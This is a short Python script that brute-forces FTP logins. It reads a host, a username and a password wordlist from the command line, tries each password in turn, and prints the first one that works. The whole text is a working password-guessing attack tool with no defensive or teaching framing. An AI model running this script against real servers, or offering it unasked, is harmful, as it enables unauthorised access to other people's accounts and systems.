from ftplib import FTP
import sys

for p in open(sys.argv[3]):
    try:
        f = FTP(sys.argv[1])
        f.login(sys.argv[2], p.strip())
        print(f'FOUND: {p}')
        break
    except:
        pass
